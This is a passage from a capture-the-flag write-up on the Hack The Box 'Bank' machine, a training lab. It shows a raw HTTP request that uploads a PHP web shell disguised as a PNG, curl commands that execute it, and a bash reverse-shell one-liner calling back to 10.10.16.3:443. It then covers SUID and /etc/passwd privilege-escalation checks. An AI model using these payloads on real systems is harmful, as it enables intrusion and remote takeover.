   * Similar to the previous step, but this time `grep -iv` is used to exclude lines containing `.acc`.
   * Result: 15 files not ending with `.acc`.
3. **Listing Files and Their Sizes**:
   * The script fetches the content, extracts file names and sizes, and sorts them by size.
   * It uses a combination of `grep`, `cut`, `tr`, `sort`, and `head`.
   * The output lists the first 10 files sorted by size, showing their names and sizes.
4. **Statistics on Byte Sizes**:
   * It retrieves file sizes, counts their occurrences, and sorts them.
   * `grep`, `cut`, `tr`, `sort`, and `uniq -c` are used.
   * The output displays the count of files for each unique byte size.
5. **Retrieving a Specific File**:
   * It fetches the content, identifies files with a size of 257 bytes, and displays their names.
   * The output reveals a single file with the specified size.
6. **Viewing the Content of the File**:
   * The script fetches the content of the file `68576f20e9732f1b2edc4df5b8533230.acc`.
   * The content includes sensitive information like full name, email, password, credit card count, transactions count, and balance.
7. **Recording the Credentials**:
   * It records the credentials (`chris@bank.htb: !##HTBB4nkP4ssw0rd!##`) in a file named `creds.txt`.
8. **Logging in to the Account**:
   * It suggests logging in to the account using the obtained credentials.
   * After successful login, it advises looking for the place to upload files, as there is a directory for uploads.
9. **Crafting a Request for File Upload**:
   * It provides instructions for crafting a request to upload a file with PHP code execution inside a PNG file.
10. **Source Code Inspection**:
    * It suggests inspecting the source code of `bank.htb/support.php` and mentions a debug block added for executing `.htb` files as PHP for debugging purposes.

<figure><img src="../.gitbook/assets/Pasted image 20231114075605.png" alt=""><figcaption><p>Burp Suite - Repeater</p></figcaption></figure>

<figure><img src="../.gitbook/assets/Pasted image 20231114075643.png" alt=""><figcaption><p>Remote Code Execution - RCE</p></figcaption></figure>

It demonstrates a systematic approach to exploring and interacting with a web application, including enumeration of files, extraction of sensitive information, and identification of potential vulnerabilities for further exploitation.

```bash
<!-- now clean the request by removing PNG components -->
POST /support.php HTTP/1.1
Host: bank.htb
Content-Length: 511
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://bank.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEOGUSjR7AU5XUxai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bank.htb/support.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: HTBBankAuth=qp491bad2gio3iv1k9p9frn863
Connection: close

------WebKitFormBoundaryEOGUSjR7AU5XUxai
Content-Disposition: form-data; name="title"

php
------WebKitFormBoundaryEOGUSjR7AU5XUxai
Content-Disposition: form-data; name="message"

php
------WebKitFormBoundaryEOGUSjR7AU5XUxai
Content-Disposition: form-data; name="fileToUpload"; filename="y.png.htb"
Content-Type: image/png

<?php system($_REQUEST["cmd"]); ?>
------WebKitFormBoundaryEOGUSjR7AU5XUxai
Content-Disposition: form-data; name="submitadd"


------WebKitFormBoundaryEOGUSjR7AU5XUxai--
```

```bash
# or you can simply create the implant.png.htb with the following php code 
<?php system($_REQUEST["cmd"]); ?>

-------------------------------------------------------------------------------

# verify with curl if php code execution works
$ curl http://bank.htb/uploads/implant.png.htb?cmd=whoami
www-data

-------------------------------------------------------------------------------

$ curl http://bank.htb/uploads/implant.png.htb --data-urlencode 'cmd=whoami'
www-data
```

### pwncat

```bash
# rs with below curl command
$ curl http://bank.htb/uploads/implant.png.htb --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.3/443 0>&1"'

-------------------------------------------------------------------------------

# install pwncat
$ sudo apt install pwncat -y

-------------------------------------------------------------------------------

# pwncat listening at 443 and you get the foothold as www-data user
$ pwncat -l 443              
bash: cannot set terminal process group (1071): Inappropriate ioctl for device
bash: no job control in this shell

-------------------------------------------------------------------------------

# by using find commands looking for unusual SUID setup
# /var/htb/bin/emergency is a sort of obvious one in the list
www-data@bank:/var/www/bank/uploads$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount

-------------------------------------------------------------------------------

# /etc/passwd is writable by everyone on the box
www-data@bank:/var/www/bank/uploads$ ls -l /etc/passwd 
ls -l /etc/passwd 
-rw-rw-rw- 1 root root 1252 May 28  2017 /etc/passwd

-------------------------------------------------------------------------------

# check the sshd config for any attack surface
$ grep PermitRootLogin /etc/ssh/sshd_config  
#PermitRootLogin without-password
PermitRootLogin yes
# the setting of "PermitRootLogin without-password".

```

This sequence of commands and actions depicts steps taken during a penetration testing exercise against a target system (`bank.htb`). Let's review each step:

1. **Reverse Shell Command**:
   - The `curl` command is used to send a payload to a potentially vulnerable endpoint (`http://bank.htb/uploads/implant.png.htb`). The payload is designed to execute a reverse shell back to the attacker's machine by using the `bash -c` command and redirecting input and output to a specified IP address and port (`10.10.16.3:443`).

2. **Installation of Pwncat**:
   - The `pwncat` tool is installed using the system package manager (`apt`). `pwncat` is a utility for handling reverse shell connections and is commonly used in penetration testing scenarios.

3. **Listening for Reverse Shell**:
   - `pwncat` is configured to listen on port `443` for an incoming reverse shell connection. Upon successful connection, the shell is obtained as the `www-data` user.

4. **Finding SUID Binaries**:
   - The `find` command is utilised to search for files with the SUID (Set User ID) bit set across the filesystem. The output reveals several binaries with the SUID bit set, including `/var/htb/bin/emergency`, which could potentially be used for privilege escalation.

5. **Checking Permissions on `/etc/passwd`**:
   - The permissions of the `/etc/passwd` file are inspected, indicating that it is writable by all users (`rw-rw-rw-`). This misconfiguration could allow unauthorised modification of user account information.

6. **Inspecting SSHD Configuration**:
   - The `sshd_config` file is examined to check the configuration related to SSH login. The output shows that `PermitRootLogin` is set to `yes`, which allows root login via SSH. This configuration could pose a security risk if not properly managed.

It's a systematic approach to identifying vulnerabilities and potential attack vectors during a penetration testing engagement. Further steps may involve exploiting discovered vulnerabilities to escalate privileges and gain deeper access to the target system.

## Exploits
